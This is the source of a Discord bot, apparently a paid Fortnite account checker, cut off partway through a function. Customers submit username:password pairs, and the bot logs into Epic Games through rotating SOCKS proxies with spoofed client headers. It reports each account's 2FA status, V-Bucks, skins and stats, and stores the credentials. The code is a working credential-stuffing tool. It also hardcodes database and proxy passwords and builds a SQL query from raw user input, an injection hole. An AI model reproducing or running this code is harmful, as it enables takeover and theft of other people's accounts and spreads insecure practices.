const Discord = require("discord.js");
const client = new Discord.Client();
const wget = require("wget");
const moment = require('moment');
const config = require("./config.json");
const request = require('request-promise');
const mariadb = require('mariadb');
const fs = require('fs');
const crypto = require("crypto");
const pMS = require('pretty-ms');
const SocksProxyAgent = require('socks-proxy-agent');

const pool = mariadb.createPool({host: 'localhost', user:'phpmyadmin', password:'#ToS875601', database:"FN_Checker", connectionLimit: 30});

const prefix = config.prefix;

var staff = [];
var msitChannel = null;
var botChannel = null;

var masschecking = [];

// Other Functions 

async function isStaff(message)
{
  var isfromstaff = false;
  console.log(staff);

  let results = await staff.filter(x => x.id == message.author.id)

  results.length > 0 ? isfromstaff = {result: results, hasAccess: true} : isfromstaff = {result: results, hasAccess: false};
  return isfromstaff;
}

function fallargs(args, from)
{
  var temp = "";
  from = parseInt(from);
  for(i = from; i < args.length; i++)
  {
    temp += args[i] + " ";
  }
  return temp;
}

function genstr(length) {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  
    for (var i = 0; i < length; i++)
      text += possible.charAt(Math.floor(Math.random() * possible.length));
    
    return text;
}

function deleteAtMidnight() {
  var now = new Date();
  var night = new Date(
      now.getFullYear(),
      now.getMonth(),
      now.getDate() + 1, // the next day, ...
      0, 0, 0 // ...at 00:00:00 hours
  );
  var msToMidnight = night.getTime() - now.getTime();

  setTimeout(function() {
      deleteChecks();       //      <-- This is the function being called at midnight.
      deleteAtMidnight();    //      Then, reset again next midnight.
  }, msToMidnight);

}

async function loadConfig() {

  staff = [];

  var server = await client.guilds.find(x => x.id == config.mainServer);
  msitChannel = await server.channels.find(x => x.id == config.missingItemsChannel);
  botChannel = await server.channels.find(x => x.id == config.botChannel);

  let conn, res;
  try {
      conn = await pool.getConnection();
      res = await conn.query(`SELECT * FROM users WHERE active = "true" AND access BETWEEN 4 AND 5`);
      await conn.end();
  } catch (err) { throw err; }

  res.forEach(row => {
    staff.push({
      id: row.userID,
      access: row.access
    });
  });

  console.log(staff);
  //console.log(staff.filter(x => x.id == "494341483978293269").length > 0);
  //console.log(msitChannel.name);
}

async function deleteChecks()
{
  let conn3, result;
    try {
        conn3 = await pool.getConnection();
        result = await conn3.query(`SELECT DISTINCT userid, count(userid) FROM checks GROUP BY userid ORDER BY count(userid) DESC`);
        await conn3.query(`TRUNCATE TABLE checks`);
        await conn3.query(`TRUNCATE TABLE mass_checks`);
        await conn3.end();
    } catch (err) { throw err; }
    console.log("All checks have been deleted at: " + moment());

    //console.log(result);

    var server = await client.guilds.find(x => x.id == config.mainServer);
    var channel = await server.channels.find(x => x.id == config.checkChannel);
    var members = await server.fetchMembers();

    var allchecks = 0;

    result.forEach(row=> {
      var arow = Object.values(row);
      allchecks += arow[1];
    });

    var place1 = result[0] == null ? null : await members.fetchMember(result[0].userid);
    var place2 = result[1] == null ? null : await members.fetchMember(result[1].userid);
    var place3 = result[2] == null ? null : await members.fetchMember(result[2].userid);

    await channel.send({embed: {
      color: 0xFFFFFF,
      fields: [
        {
          name: `All checks have been deleted!`,
          value: `** **`
        },
        {
          name: `Total Amount of Checks:`,
          value: allchecks
        },
        {
          name: `Top 1:`,
          value: `**${place1.user.username}**#${place1.user.discriminator} -> ${Object.values(result[0])[1]} checks`
        },
        {
          name: `Top 2:`,
          value: `**${place2.user.username}**#${place2.user.discriminator} -> ${Object.values(result[1])[1]} checks`
        },
        {
          name: `Top 3:`,
          value: `**${place3.user.username}**#${place3.user.discriminator} -> ${Object.values(result[2])[1]} checks`
        },
      ]
    }});
} 

async function getRandomProxy()
{
  let conn, res;
  try {
      conn = await pool.getConnection();
      res = await conn.query(`SELECT * FROM proxies WHERE banned = "false" ORDER BY RAND() LIMIT 1`);
      await conn.end();
  } catch (err) { throw err; }

  delete res.meta;
  console.log(res);
  return res;
}

async function extactStats(rawstats, otherdata)
{
  //br_([a-z0-9]*)_([a-z90-9]{2,3})_m0_([p0-9]{2,3})

  var results = {
    mods: {
      solo: {
        wins: 0,
        top10: 0,
        top25: 0,
        kills: 0,
        matches_played: 0,
        time_played: 0
      },
      duo: {
        wins: 0,
        top5: 0,
        top12: 0,
        kills: 0,
        matches_played: 0,
        time_played: 0
      },
      squad: {
        wins: 0,
        top3: 0,
        top6: 0,
        kills: 0,
        matches_played: 0,
        time_played: 0
      }
    },
    info: {
      accountID: otherdata.id,
      username: otherdata.username,
      ownSTW: otherdata.hasSTW,
      ownedVBucks: otherdata.vbucks,
      platform: null
    }
  }

  const regex = /br_([a-z0-9]*)_([a-z90-9]{2,3})_m0_([p0-9]{2,3})/;
  let m;

  for(i = 0; i < rawstats.length; i++)
  {
    m = regex.exec(rawstats[i].name);
    if(i == 0) results.info.platform = m[2];
    
    switch(m[3])
    {
      case "p2": //Solo
          switch (m[1])
          {
            case "placetop1":
                results.mods.solo.wins = rawstats[i].value;
            break;
            case "placetop10":
                results.mods.solo.top10 = rawstats[i].value;
            break;
            case "placetop25":
                results.mods.solo.top25 = rawstats[i].value;
            break;
            case "kills":
                results.mods.solo.kills = rawstats[i].value;
            break;
            case "matchesplayed":
                results.mods.solo.matches_played = rawstats[i].value;
            break;
            case "minutesplayed":
                results.mods.solo.time_played = rawstats[i].value;
            break;
          }
        break;

      case "p10": //Duo
          switch (m[1])
          {
            case "placetop1":
                results.mods.duo.wins = rawstats[i].value;
            break;
            case "placetop5":
                results.mods.duo.top5 = rawstats[i].value;
            break;
            case "placetop12":
                results.mods.duo.top12 = rawstats[i].value;
            break;
            case "kills":
                results.mods.duo.kills = rawstats[i].value;
            break;
            case "matchesplayed":
                results.mods.duo.matches_played = rawstats[i].value;
            break;
            case "minutesplayed":
                results.mods.duo.time_played = rawstats[i].value;
            break;
          }
        break;

      case "p9": //Squad
          switch (m[1])
          {
            case "placetop1":
                results.mods.squad.wins = rawstats[i].value;
            break;
            case "placetop3":
                results.mods.squad.top3 = rawstats[i].value;
            break;
            case "placetop6":
                results.mods.squad.top6 = rawstats[i].value;
            break;
            case "kills":
                results.mods.squad.kills = rawstats[i].value;
            break;
            case "matchesplayed":
                results.mods.squad.matches_played = rawstats[i].value;
            break;
            case "minutesplayed":
                results.mods.squad.time_played = rawstats[i].value;
            break;
          }
        break;
    }
    //console.log(m);

  }
  return results;
}

async function encrypt(text, key){
  var cipher = crypto.createCipher('aes-256-cbc',key);
  var crypted = cipher.update(text,'utf8','hex');
  crypted += cipher.final('hex');
  return crypted;
}

async function decrypt(text, key){
  var decipher = crypto.createDecipher('aes-256-cbc',key);
  var dec = decipher.update(text,'hex','utf8');
  dec += decipher.final('utf8');
  return dec;
}

async function manageproxies(proxy, tobebanned, bantime)
{

  let conn;
  try {
      conn = await pool.getConnection();
      //console.log(items);
      await conn.query(`UPDATE proxies SET banned = ? WHERE id = ?;`, [tobebanned, proxy.id]);
      await conn.end();
  } catch (err) { throw err; }
  
  if(tobebanned === "true")
  {
    botChannel.send({embed: {
      color: 0xff0000,
      timestamp: moment().add(bantime, "ms"),
      footer:
      {
        icon_url: client.user.avatarURL,
        text: `Will be unbanned at`
      },
      fields: [{
          name: `Proxy Banned!`,
          value: `Banned for \`${pMS(bantime)}\`, Proxy ID: ${proxy.id}`
        }]
    }});
  }
  else
  {
    botChannel.send({embed: {
      color: 0x00ff00,
      fields: [{
          name: `Proxy Unbanned!`,
          value: `Proxy ID: ${proxy.id}`
        }]
    }});
  }

}

async function isWProxy(message, proxy)
{
  var result = null;

  var agent = new SocksProxyAgent({
    host: proxy[0].ip,
    port: proxy[0].port,
    protocol: 'socks:',
    auth: `${proxy[0].username}:XsKfHlNVIR`
  });

  var options = {
    url: 'https://api.myip.com/',
    body: ``,
    agent: agent,
  };

  await request(options).then( async function (body){
    var info = JSON.parse(body);
    if(info.ip == proxy[0].ip) 
    {
      console.log(`Everthing is fine! The request IP is -> ${proxy[0].ip}:${proxy[0].port} @ ${proxy[0].id} in DB`);
      result = true;
    }
    else
    {
      if(info.ip != config.currentIP) 
      {
        console.log(`Everthing is fine! The request IP is different from the machine -> ${proxy[0].ip}:${proxy[0].port} @ ${proxy[0].id} in DB`);
        result = true;
      }
      else
      {
        console.log(`!!! FATAL ERROR !!! The request IP is -> ${proxy[0].ip}:${proxy[0].port} @ ${proxy[0].id} in DB`);
        let conn;
        try {
            conn = await pool.getConnection();
            await conn.query(`DELETE FROM proxies WHERE id = ?`, [proxy[0].id]);
            await conn.end();
        } catch (err) { throw err; }
        result = false;
      }
    }
  }).catch( async function (err) {
    console.log(`ERROR: ${err.name} -> ${err.message}`);

    if(err.name == "RequestError") 
    {
      let conn;
      try {
          conn = await pool.getConnection();
          await conn.query(`DELETE FROM proxies WHERE id = ?`, [proxy[0].id]);
          await conn.end();
      } catch (err) { throw err; }
    }
    result = false;
  });
  
  return result;
}

// Commands Functions

// Single Checker
async function checkCMD(message, args, checkingmessage)
{ 
  //console.log("Is a Customer: " + message.member.roles.has("514862196186939392"));
  if(message.guild && !checkingmessage) await message.delete();
  if(message.guild && message.channel.id != config.checkChannel) return message.reply(`Use only <#${config.checkChannel}> or the bot DM!`);

  var server = await client.guilds.find(x => x.id == config.mainServer);
  var members = await server.fetchMembers();
  var member = await members.members.find(m => m.id == message.author.id);

  if(!member.roles.has(config.customerRole)) return;
  if (!args[0]) return message.channel.send("No account details given!");
  
  var proxy = await getRandomProxy();

  if(proxy.length == 0) return message.channel.send({embed: {
    color: 0xff0000,
    fields: [{
        name: `‼ Fatal Error ‼`,
        value: `Please report this to **ToS#3333**,\nas there aren\'t any available proxies!`
      }]
  }});

  var account = args[0].split(":");
  var items = {
    pickaxes: [],
    backpacks: [],
    skins: [],
    dances: [],
    gliders: []
  }

  var stats = {};
  var ownSTW = false;
  var ownedVBucks = 0;

  var agent = new SocksProxyAgent({
    host: proxy[0].ip,
    port: proxy[0].port,
    protocol: 'socks:',
    auth: `${proxy[0].username}:XsKfHlNVIR`
  });

  var encode = await encrypt(`${account[0]}:${account[1]}`, message.author.id);

  let xsfrToken = null;
  let j = request.jar();

  let working = await isWProxy(message, proxy);
  console.log(`${working} | ${!working}`);
  if(!working) return checkCMD(message, args, checkingmessage);

  console.log(`${message.author.id} | ${encode}`);
  if(!checkingmessage) checkingmessage = await message.channel.send({embed: {
      color: 0xffffff,
      footer:
      {
        icon_url: message.author.avatarURL,
        text: `Check by ${message.author.username}`
      },
      author: {
        name: "Check ongoing",
        icon_url: "https://cdn.discordapp.com/emojis/515585176273944587.gif"
      },
      fields: [{
          name: `** **`,
          value: `**Processing your request...**`
        }]
  }});

  var options100 = {
    url: 'https://accounts.epicgames.com/login/doLauncherLogin?client_id=24a1bff3f90749efbfcbc576c626a282&redirectUrl=https%3A%2F%2Faccounts.launcher-website-prod07.ol.epicgames.com%2Flogin%2FshowPleaseWait%3Fclient_id%3D24a1bff3f90749efbfcbc576c626a282%26rememberEmail%3Dfalse',
    method: 'GET',
    headers: {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/9.6.1-4858958+++Portal+Release-Live UnrealEngine/4.21.0-4858958+++Portal+Release-Live Safari/537.36",
      'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
    },
    jar: j,                            
    body: ``,
    //body: `grant_type=password&username=${account[0]}&password=${account[1]}&includePerms=true&token_type=eg1`,
    timeout: 5000,
    agent: agent
  };

  await request(options100).then( async function (body){
    //var info = JSON.parse(body);
    //console.log(info);
    let cookieJar = j.getCookieString("https://accounts.epicgames.com/login?lang=en_US&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2F&client_id=007c0bfe154c4f5396648f013c641dcf&noHostRedirect=true");
    let findCookie = /XSRF-TOKEN=(.*);/gm;
    
    let cookie = findCookie.exec(cookieJar);
    console.log(xsfrToken);
    xsfrToken = cookie[1];
    console.log(xsfrToken);
  
    var options = {
      url: 'https://accounts.launcher-website-prod07.ol.epicgames.com/login/doLauncherLogin',
      method: 'POST',
      headers: {
        'Allow-Auto-Redirect': false,
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/9.6.1-4858958+++Portal+Release-Live UnrealEngine/4.21.0-4858958+++Portal+Release-Live Safari/537.36",
        'X-XSRF-TOKEN': xsfrToken,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
      },
      jar: j,                            
      body: `fromForm=yes&authType=&linkExtAuth=&client_id=24a1bff3f90749efbfcbc576c626a282&redirectUrl=https%3A%2F%2Faccounts.launcher-website-prod07.ol.epicgames.com%2Flogin%2FshowPleaseWait%3Fclient_id%3D24a1bff3f90749efbfcbc576c626a282%26rememberEmail%3Dfalse&epic_username=${account[0]}&password=${account[1]}&rememberMe=YES`,
      //body: `grant_type=password&username=${account[0]}&password=${account[1]}&includePerms=true&token_type=eg1`,
      timeout: 5000,
      agent: agent
    };

    await request(options).then( async function (body){
      var info = JSON.parse(body);
      //console.log(info);
      
      var options2 = {
        url: info.redirectURL,
        method: 'GET',
        headers: {
          'Allow-Auto-Redirect': false,
          'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/9.6.1-4858958+++Portal+Release-Live UnrealEngine/4.21.0-4858958+++Portal+Release-Live Safari/537.36",
          'X-XSRF-TOKEN': xsfrToken,
          'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
        },
        jar: j,                            
        body: ``,
        //body: `grant_type=password&username=${account[0]}&password=${account[1]}&includePerms=true&token_type=eg1`,
        timeout: 5000,
        agent: agent
      };

      await request(options2).then( async function (body){
        //console.log(body);
        let regex = /com\.epicgames\.account\.web\.widgets\.loginWithExchangeCode\(\'(.*)\'\,/gm;
        let m = regex.exec(body);

        var options3 = {
          url: 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',
          method: 'POST',
          headers: {
            'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
            'Authorization': "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=",
            'Keep-Alive': true,
            'Connect-Timeout': 5000,
            'Allow-Auto-Redirect': false,
            'content-type': 'application/x-www-form-urlencoded'
          },
          jar: j,
          body: `grant_type=exchange_code&exchange_code=${m[1]}&token_type=eg1`,
          timeout: 5000,
          agent: agent
        };

        await request(options3).then( async function (body){
          //if(err) return console.error(err);
          var info = JSON.parse(body);
          //console.log(info);
          //console.log(res);
          if(info.access_token)
          { 
              //console.log(info);
              var options100 = {
                url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=campaign&rvn=-1`,
                method: 'POST',
                headers: {
                  'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
                  'Authorization': `bearer ${info.access_token}`,
                  'Keep-Alive': true,
                  'Connect-Timeout': 5000,
                  'Allow-Auto-Redirect': false,
                  'content-type': 'application/json'
                },
                body: "{}",
                agent: agent
              };

              await request(options100).then( async function (body){
                var info100 = JSON.parse(body); 
                //console.log(JSON.stringify(info100.profileChanges[0].profile, null, 4));
                for (var item in info100.profileChanges[0].profile.items) {
                  //console.log(item);
                  var itemid = info100.profileChanges[0].profile.items[item].templateId.split(":");
                  if(itemid[0] == "GiftBox" || itemid[1].startsWith("gb_"))
                  {
                    ownSTW = true;
                    break;
                  }
                }
                console.log(info100.profileChanges[0].profile.stats.attributes.level);
                console.log(info100.profileChanges[0].profile.stats.attributes.xp);
                if(!ownSTW && info100.profileChanges[0].profile.stats.attributes.level == 1 && info100.profileChanges[0].profile.stats.attributes.xp == 0) ownSTW = false;
                else ownSTW = true;
              });

              var options101 = {
                url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=common_core&rvn=-1`,
                method: 'POST',
                headers: {
                  'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
                  'Authorization': `bearer ${info.access_token}`,
                  'Keep-Alive': true,
                  'Connect-Timeout': 5000,
                  'Allow-Auto-Redirect': false,
                  'content-type': 'application/json'
                },
                body: "{}",
                agent: agent
              };

              await request(options101).then( async function (body){
                var info101 = JSON.parse(body); 
                //console.log(JSON.stringify(info101.profileChanges[0].profile, null, 4));

                for (var item in info101.profileChanges[0].profile.items) {
                  //console.log(item);
                  var itemid = info101.profileChanges[0].profile.items[item].templateId.split(":");
                  if(itemid[0] == "Currency") ownedVBucks += info101.profileChanges[0].profile.items[item].quantity;
                }
              });

              console.log("Has STW: " + ownSTW);
              console.log("VBucks: " + ownedVBucks);
              
              var options2 = {
                url: `https://account-public-service-prod03.ol.epicgames.com/account/api/public/account?accountId=${info.account_id}`,
                method: 'GET',
                headers: {
                  'Authorization': `bearer ${info.access_token}`,
                  'Connect-Timeout': 5000,
                  'content-type': 'application/json'
                },
                body: "{}",
                agent: agent
              };
              
              await request(options2).then( async function (body){
                //if(err) return console.error(err);
                var info2 = JSON.parse(body); 
                //console.log(info2);
                var options4 = {
                  url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/stats/accountId/${info2[0].id}/bulk/window/alltime`,
                  method: 'GET',
                  headers: {
                    'Authorization': `bearer ${info.access_token}`,
                    'Connect-Timeout': 5000,
                    'content-type': 'application/json'
                  },
                  body: "{}",
                  agent: agent
                };

                await request(options4).then( async function (body){
                  //if(err) return console.error(err);
                  var info4 = JSON.parse(body); 
                  //console.log(info4);
                  
                  stats = await extactStats(info4, {id: info2[0].id, username: info2[0].displayName, hasSTW: ownSTW, vbucks: ownedVBucks});
                }).catch( function (err) {
                  console.error(err);
                  let info = JSON.parse(err.error);
                  //console.log(err.message);
                  //console.log(typeof(err.message));
                  if(info.error_message)
                  {
                    message.channel.send({embed: {
                        color: 0xff0000,
                        fields: [{
                            name: `API Error`,
                            value: `Please report this to **ToS#3333**,\n\`${info.query.args}\`\nError uCode: \`#0022\``
                          }]
                    }});
                  }
                  else
                  {
                    message.channel.send({embed: {
                      color: 0xff0000,
                      fields: [{
                          name: `API or Check Error`,
                          value: "Something strange happened,\nif this continue please contact ToS#3333\nError uCode: \`#0022\`"
                        }]
                  }});
                  }
                });;

              }).catch( function (err) {
                console.error(err);
                let info = JSON.parse(err.error);
                //console.log(err.message);
                //console.log(typeof(err.message));
                if(info.error_message)
                {
                  message.channel.send({embed: {
                      color: 0xff0000,
                      fields: [{
                          name: `API Error`,
                          value: `Couldn't capture the account gameplay statistics!`
                        }]
                  }});
                }
                else
                {
                  message.channel.send({embed: {
                    color: 0xff0000,
                    fields: [{
                        name: `API or Check Error`,
                        value: "Something strange happened,\nif this continue please contact ToS#3333\nError uCode: \`#0021\`"
                      }]
                }});
                }
              });

              var options3 = {
                url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=athena&rvn=-1`,
                method: 'POST',
                headers: {
                  'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
                  'Authorization': `bearer ${info.access_token}`,
                  'Keep-Alive': true,
                  'Connect-Timeout': 5000,
                  'Allow-Auto-Redirect': false,
                  'content-type': 'application/json'
                },
                body: "{}",
                agent: agent
              };

              let conn3, results;
              try {
                conn3 = await pool.getConnection();

                await request.post(options3).then( async function (body){
                //if(err) return console.error(err);
                var info = JSON.parse(body);  
                
                //console.log(JSON.stringify(info.profileChanges[0].profile, null, 4));
                for (var item in info.profileChanges[0].profile.items) {
                  // skip loop if the property is from prototype
                  var itemid = info.profileChanges[0].profile.items[item].templateId.split(":");
                  if(!itemid[1].startsWith("default"))
                  {
                    switch (itemid[0])
                    {
                      case "AthenaPickaxe":
                        pickaxedata = await conn3.query(`SELECT * FROM pickaxes WHERE fullid = ?`, [itemid[1]]);
                        if(pickaxedata.length > 0)
                        {
                          //console.log(pickaxedata[0]);
                          items.pickaxes.push(pickaxedata[0].name);
                        }
                        else
                        {
                          items.pickaxes.push(itemid[1].toLowerCase());
                          msitChannel.send({embed: {
                            color: 0xff0000,
                            fields: [{
                                name: `Items API Error`,
                                value: `\`${itemid[1].toLowerCase()}\``
                              }]
                          }});
                        }
                        break;
                      case "AthenaGlider":
                        gliderdata = await conn3.query(`SELECT * FROM gliders WHERE fullid = ?`, [itemid[1]]);
                        if(gliderdata.length > 0)
                        {
                          //console.log(gliderdata[0]);
                          items.gliders.push(gliderdata[0].name);
                        }
                        else
                        {
                          items.gliders.push(itemid[1].toLowerCase());
                          msitChannel.send({embed: {
                            color: 0xff0000,
                            fields: [{
                                name: `Items API Error`,
                                value: `\`${itemid[1].toLowerCase()}\``
                              }]
                          }});
                        }
                        break;
                      case "AthenaBackpack":
                        backpackdata = await conn3.query(`SELECT * FROM backpacks WHERE fullid = ?`, [itemid[1]]);
                        if(backpackdata.length > 0)
                        {
                          //console.log(backpackdata[0]);
                          items.backpacks.push(backpackdata[0].name);
                        }
                        else
                        {
                          items.backpacks.push(itemid[1].toLowerCase());
                          msitChannel.send({embed: {
                            color: 0xff0000,
                            fields: [{
                                name: `Items API Error`,
                                value: `\`${itemid[1].toLowerCase()}\``
                              }]
                          }});
                        }
                        break;
                      case "AthenaDance":
                        if(itemid[1].startsWith("eid") && itemid[1] != "eid_dancemoves")
                        {
                          dancedata = await conn3.query(`SELECT * FROM dances WHERE fullid = ?`, [itemid[1]]);
                          if(dancedata.length > 0)
                          {
                            //console.log(dancedata[0]);
                            items.dances.push(dancedata[0].name);
                          }
                          else
                          {
                            items.dances.push(itemid[1].toLowerCase());
                            msitChannel.send({embed: {
                              color: 0xff0000,
                              fields: [{
                                  name: `Items API Error`,
                                  value: `\`${itemid[1].toLowerCase()}\``
                                }]
                            }});
                          }
                        }
                        break;
                      case "AthenaCharacter":
                        skindata = await conn3.query(`SELECT * FROM skins WHERE fullid = ?`, [itemid[1]]);
                        if(skindata.length > 0)
                        {
                          //console.log(skindata[0]);
                          items.skins.push(skindata[0].name);
                        }
                        else
                        {
                          items.skins.push(itemid[1].toLowerCase());
                          msitChannel.send({embed: {
                            color: 0xff0000,
                            fields: [{
                                name: `Items API Error`,
                                value: `\`${itemid[1].toLowerCase()}\``
                              }]
                          }});
                        }
                        break;
                    }
                  }
                }

                for (var stat in info.profileChanges[0].profile.stats.attributes) {
                  switch (stat)
                  {
                    case "book_purchased":
                        stats.info.battlePass = info.profileChanges[0].profile.stats.attributes[stat];
                      break;
                    case "book_level":
                        stats.info.battleTire = info.profileChanges[0].profile.stats.attributes[stat];
                      break;
                  }
                  //info.profileChanges[0].profile.stats.attributes[stats]
                }
              }).catch( function (err) {
                console.error(err);
                let info = JSON.parse(err.error);
                //console.log(err.message);
                //console.log(typeof(err.message));
                if(info.error_message)
                {
                  message.channel.send({embed: {
                      color: 0xffffff,
                      fields: [{
                          name: `Items API Error`,
                          value: `Please report this to **ToS#3333**,\n\`${info.query.args}\``
                        }]
                  }});
                }
                else
                {
                  message.channel.send({embed: {
                    color: 0xffffff,
                    fields: [{
                        name: `API or Check Error`,
                        value: "Something strange happened,\nif this continue please contact ToS#3333"
                      }]
                }});
                }
              });
              console.log(items);

              if(items.pickaxes.length == 0 && items.backpacks.length == 0 && items.gliders.length == 0 && items.skins.length == 0)
              {
                await checkingmessage.delete();
                return message.channel.send({embed: {
                  color: 0x0000ff,
                  footer:
                    {
                      icon_url: message.author.avatarURL,
                      text: `Check by ${message.author.username}`
                    },
                  fields: [{
                      name: `Check Completed`,
                      value: "This account is fully default!"
                    }]
                }});
              }
        
              
                  //console.log(items);
                  results = await conn3.query(`INSERT INTO checks (userid, credits, stats, items, time) VALUES (?, ?, ?, ?, ?)`, [message.author.id, encode, JSON.stringify(stats), JSON.stringify(items), new Date()]);
                  await conn3.end();
              } catch (err) { throw err; }
        
              //console.log(results);
        
              if(message.guild)
              {
                  var requestTime = Date.now() - checkingmessage.createdTimestamp;
                  console.log(`This request took: ${pMS(requestTime)}`);
                  await checkingmessage.delete();
                  await message.channel.send({embed: {
                      color: 0xffee00,
                      footer:
                      {
                        icon_url: message.author.avatarURL,
                        text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
                      },
                      fields: [{
                          name: `Check Completed`,
                          value: `To show **PVE Stats:** \`${prefix}pvestat ${results.insertId}\` - **SOON!**\nTo show **Stats:** \`${prefix}stats ${results.insertId}\`\nTo show **Items:** \`${prefix}items ${results.insertId}\``
                          },{
                              name: `** **`,
                              value: `**Remain from using the Guild for checks,\nuse bot DM instead its private!**`
                          }]
                  }});
              }
              else
              { 
                  var requestTime = Date.now() - checkingmessage.createdTimestamp;
                  console.log(`This request took: ${pMS(requestTime)}`);
                  await checkingmessage.delete();
                  await message.channel.send({embed: {
                      color: 0x00ff00,
                      footer:
                      {
                        icon_url: message.author.avatarURL,
                        text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
                      },
                      fields: [{
                          name: `Check Completed`,
                          value: `To show **PVE Stats:** \`${prefix}pvestat ${results.insertId}\` - **SOON!**\nTo show **Stats:** \`${prefix}stats ${results.insertId}\`\nTo show **Items:** \`${prefix}items ${results.insertId}\``
                          }]
                  }});
                  var channel = members.channels.find(x => x.id == config.checkChannel);
                  channel.send({embed: {
                    color: 0x00ff00,
                    footer:
                    {
                      icon_url: message.author.avatarURL,
                      text: `Check by ${message.author.username} | In ${pMS(requestTime)}`
                    },
                    fields: [{
                        name: `Check Completed - ID: ${results.insertId}`,
                        value: `** **`
                        }]
                        
                  }});
              }
            /*var requestTime = Date.now() - checkingmessage.createdTimestamp;
            console.log(`This request took: ${pMS(requestTime)}`);
            await checkingmessage.delete();

            
            let m = await message.author.send({embed: {
              color: 0x00ff00,
              footer:
              {
                icon_url: message.author.avatarURL,
                text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
              },
              fields: [{
                name: `Check Completed - Check ID: ${results.insertId}`,
                value: `**Use the reactions to navigate!**`
                }
              ]
            }});
            console.log(m.author.username);
            
            await m.react(`🆚`);
            await m.react(`⛏`);
            await m.react(`☂`);
            await m.react(`👜`);
            await m.react(`🙍`);
              
            let conn4;
            try {
                conn4 = await pool.getConnection();
                //console.log(items);
                await conn4.query(`UPDATE checks SET messageID = ? WHERE id = ?`, [m.id, results.insertId]);
                await conn4.end();
            } catch (err) { throw err; }*/
          }  
        });
      });
    }).catch( async function (err) {     
      
      let extractError = /<div class=\\"errorCodes generalExceptionError\\">\\n\s.*<span>(.*)\W.*<\/span>\W.*<\/div>\\n\\n\\n\s.*\\n\\n/gm;
      let extractError2 = /Enter the security code to continue/gm;
      let error = extractError.exec(err);

      console.error(err);

      if(error) return await checkingmessage.delete() && await message.channel.send({embed: {
          color: 0xff0000,
          footer:
          {
            icon_url: message.author.avatarURL,
            text: `Check by ${message.author.username}`
          },
          fields: [{
              name: `Check Failed`,
              value: error[1]
            }]
      }});
      else
      {
        error = extractError2.exec(err);
    
        await checkingmessage.delete() && await message.channel.send({embed: {
          color: 0xff0000,
          footer:
          {
            icon_url: message.author.avatarURL,
            text: `Check by ${message.author.username}`
          },
          fields: [{
              name: `Check Failed`,
              value: `2FA is enabled on this account!`
            }]
        }});
      }
    });
  });
}

async function statsCMD(message, args)
{
  if(!args[0]) return message.channel.send("No check ID given!");

  if(args[1])
  {
    let conn3, results;
    try {
        conn3 = await pool.getConnection();
        results = await conn3.query(`SELECT * FROM checks WHERE id = '${args[0]}'`);
        await conn3.end();
    } catch (err) { throw err; }
    if(!results[0]) return message.channel.send("Cannot find check with id: " + args[0]);
    var stats = JSON.parse(results[0].stats);
    await message.author.send({embed: {
      color: 0x00ff00,
      title: `Stats ${args[1].replace(/^(.)|\s(.)/g, ($1) => $1.toUpperCase())} - Check ID: ${results[0].id}`,
      fields: [{
              name: `Wins:`,
              value: `${stats.mods[args[1].toLowerCase()].wins}`
            },{
              name: args[1].toLowerCase() == "solo" ? "Top 10" : args[1] == "duo" ? "Top 5" : "Top 3",
              value: args[1].toLowerCase() == "solo" ? stats.mods[args[1].toLowerCase()].top10 : args[1].toLowerCase() == "duo" ? stats.mods[args[1].toLowerCase()].top5 : stats.mods[args[1].toLowerCase()].top3
            },{
              name: args[1].toLowerCase() == "solo" ? "Top 25" : args[1] == "duo" ? "Top 12" : "Top 6",
              value: args[1].toLowerCase() == "solo" ? stats.mods[args[1].toLowerCase()].top25 : args[1].toLowerCase() == "duo" ? stats.mods[args[1].toLowerCase()].top12 : stats.mods[args[1].toLowerCase()].top6
            },{
              name: `Kills:`,
              value: `${stats.mods[args[1].toLowerCase()].kills}`,
            },{
              name: `Matches Played:`,
              value: `${stats.mods[args[1].toLowerCase()].matches_played}`,
            },{
              name: `Time Played:`,
              value: `${stats.mods[args[1].toLowerCase()].time_played}`,
      }]
    }});
  }
  else
  {
    let conn3, results;
    try {
        conn3 = await pool.getConnection();
        results = await conn3.query(`SELECT * FROM checks WHERE id = '${args[0]}'`);
        await conn3.end();
    } catch (err) { throw err; }
    if(!results[0]) return message.channel.send("Cannot find check with id: " + args[0]);
    var stats = JSON.parse(results[0].stats);
    await message.author.send({embed: {
      color: 0x00ff00,
      title: `Stats General - Check ID: ${results[0].id}`,
      fields: [{
              name: `Display Name:`,
              value: `${stats.info.username}`,
              inline: true
            },{
              name: `Platform:`,
              value: `${stats.info.platform}`,
              inline: true
            },{
              name: `Has STW?:`,
              value: `${stats.info.ownSTW}`,
              inline: true
            },{
              name: `Battle Pass?:`,
